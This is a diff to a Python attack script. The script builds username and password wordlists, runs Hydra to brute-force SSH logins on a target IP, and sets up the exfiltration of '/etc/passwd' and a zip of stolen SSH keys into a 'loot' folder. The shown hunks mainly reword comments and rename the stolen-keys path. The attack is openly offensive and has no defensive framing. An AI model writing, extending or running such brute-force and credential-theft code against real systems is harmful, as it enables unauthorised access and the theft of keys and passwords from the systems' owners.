@@ -11,7 +11,7 @@ output_file = "cracked.txt"
 usernames_file = "usernames.txt"
 passwords_file = "passwords.txt"
 file_to_exfil1 = "/etc/passwd"
-file_to_exfil2 = "/tmp/ssh_steal/ssh_keys.zip"  # Assume it already exists on victim
+file_to_exfil2 = "/tmp/steal/ssh_keys.zip"
 exfil_destination = "./loot"
 
 # === REALISTIC USERNAMES AND PASSWORDS ===
@@ -38,16 +38,16 @@ def extend_list(base_list, target_len):
 usernames = extend_list(common_usernames, 100)
 passwords = extend_list(common_passwords, 100)
 
-# === STEP 1: Write wordlists ===
-print("[*] Writing 100 realistic usernames and passwords...")
+# --Write wordlists 
+print("[*] Creating usernames and passwords...")
 with open(usernames_file, "w") as ufile:
     ufile.write('\n'.join(usernames) + '\n')
 
 with open(passwords_file, "w") as pfile:
     pfile.write('\n'.join(passwords) + '\n')
 
-# === STEP 2: Hydra brute-force ===
-print("[*] Running Hydra brute-force...")
+# -- Hydra brute-force
+print("[*] Running Hydra brute force attack ")
 hydra_cmd = f"hydra -L {usernames_file} -P {passwords_file} ssh://{target_ip} -f -o {output_file}"
 if os.system(hydra_cmd) != 0:
     print("[!] Hydra failed or found nothing.")
